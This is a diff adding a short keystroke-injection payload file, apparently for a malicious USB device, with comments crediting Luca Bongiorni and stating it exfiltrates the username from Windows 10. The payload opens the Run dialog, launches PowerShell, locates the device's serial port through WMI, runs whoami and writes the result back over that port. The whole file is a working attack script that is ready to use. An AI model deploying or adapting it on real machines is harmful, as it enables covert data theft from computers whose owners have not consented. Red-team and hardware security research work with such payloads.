@@ -1,0 +1,11 @@
+Rem: Exfiltrate the username from a Windows machine
+Rem: This payload was written by Luca Bongiorni
+Rem: You may need to adjust the delays depending on the hardware specs for the machine
+Rem: Tested on Windows 10 Enterprise
+DefaultDelay:50
+CustomDelay:3000
+Press:131+114
+CustomDelay:1000
+PrintLine:powershell
+CustomDelay:1000
+PrintLine:$s=(Get-WmiObject -Class Win32_PnPEntity -Namespace "root\CIMV2" -Filter "PNPDeviceID like 'USB\\VID_1b4f&PID_9208%'").Caption; $com=[regex]::match($s,'\(([^\)]+)\)').Groups[1].Value; $cmd=whoami; $port= new-Object System.IO.Ports.SerialPort $com,38400,None,8,one; $port.open(); $port.WriteLine("SerialEXFIL:$cmd"); $port.Close(); exit;
